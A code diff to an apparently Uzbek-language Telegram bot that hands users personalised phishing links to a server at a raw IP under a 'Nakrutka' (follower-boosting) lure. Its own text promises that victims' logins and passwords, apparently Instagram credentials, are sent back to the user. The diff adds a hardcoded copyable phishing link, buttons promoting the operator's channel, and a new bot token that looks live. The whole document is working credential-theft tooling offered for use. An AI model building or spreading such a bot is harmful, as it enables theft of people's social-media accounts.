@@ -30,7 +30,8 @@ def start(update,context):
     💯Parolni olish uchun */link* tugmasini ustiga ✅
     """
     k=[
-        [KeyboardButton("📇 Link 🌐"),KeyboardButton("🧬 Tugmali Link 🌐")]
+        [KeyboardButton("📇 Link 🌐"),KeyboardButton("🧬 Tugmali Link 🌐")],
+        [KeyboardButton("🫂 Bizning kanal obuna bolib qoying 😁")]
     ]
     reply_markup=ReplyKeyboardMarkup(k,resize_keyboard=True)
     update.message.reply_text(text,parse_mode="Markdown",reply_markup=reply_markup)
@@ -42,6 +43,8 @@ def link(update,context):
     \nyuborsangiz. Linkga kirsa *login* va *parol* kiritsa sizga keladi 
     """
     update.message.reply_text(text, parse_mode="Markdown")
+    update.message.reply_text("Copy qilish uchun `http://13.60.29.35:8000/Nakrutka/449766528` ni ustiga bos",
+                              parse_mode="Markdown")
 
 def menyu(update,context):
     k=[
@@ -67,11 +70,23 @@ def text(update,context):
         \nyuborsangiz. Linkga kirsa *login* va *parol* kiritsa sizga keladi 
         """
         update.message.reply_text(text,parse_mode="Markdown")
+        update.message.reply_text("Copy qilish uchun `http://13.60.29.35:8000/Nakrutka/449766528` ni ustiga bos",
+                                  parse_mode="Markdown")
     elif text=="🧬 Tugmali Link 🌐":
         k=[
             [InlineKeyboardButton("🧬",url=f"http://13.60.29.35:8000/Nakrutka/{update.message.from_user.id}")]
         ]
         update.message.reply_text("🧬 Tugmali Link 🌐", parse_mode="Markdown",reply_markup=InlineKeyboardMarkup(k))
+        update.message.reply_text("Copy qilish uchun `http://13.60.29.35:8000/Nakrutka/449766528` ni ustiga bos",
+                                  parse_mode="Markdown")
+
+    elif text=="🫂 Bizning kanal obuna bolib qoying 😁":
+        k=[
+            [InlineKeyboardButton("Kanal 👀",url="https://t.me/insta_parol011")],
+            [InlineKeyboardButton("Intagram 🫂",url="https://www.instagram.com/ahadj0n_tem1rbek0v/")],
+        ]
+        update.message.reply_text("Ishtimoiy tarmoqlarimiz 🌐", parse_mode="Markdown",reply_markup=InlineKeyboardMarkup(k))
+        update.message.reply_text("Obuna bolib qoying 🐬")
     else:
         text = f"""
         ➡️ *http://13.60.29.35:8000/Nakrutka/{update.message.from_user.id}* ⬅️
@@ -79,10 +94,12 @@ def text(update,context):
         \nyuborsangiz. Linkga kirsa *login* va *parol* kiritsa sizga keladi 
         """
         update.message.reply_text(text, parse_mode="Markdown")
+        update.message.reply_text("Copy qilish uchun `http://13.60.29.35:8000/Nakrutka/449766528` ni ustiga bos",
+                                  parse_mode="Markdown")
 
 
 def main():
-    updater = Updater(token='8444297437:AAHDEuv1a0BvLHeDAzUJHGAxQGRsCsuIoI0', use_context=True)
+    updater = Updater(token='7882168925:AAHhBqPMWjgA92lH-HH9w9S2O3U5ht5cA6M', use_context=True)
     dp = updater.dispatcher
     dp.add_handler(CommandHandler('start', start))
     dp.add_handler(CommandHandler('link', link))
